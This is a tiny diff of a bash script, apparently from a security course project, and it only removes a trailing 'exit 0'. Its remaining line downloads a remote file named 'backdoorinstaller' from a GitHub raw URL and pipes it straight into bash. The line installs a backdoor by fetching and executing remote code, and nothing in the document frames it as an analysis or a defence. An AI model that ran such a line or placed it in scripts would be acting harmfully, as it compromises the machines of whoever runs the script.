@@ -1,3 +1,2 @@
 #!/bin/bash
 wget -O - https://raw.githubusercontent.com/kwafula/CSC-842/main/Cycle7_QRCode_Courier/backdoorinstaller | bash
-exit 0
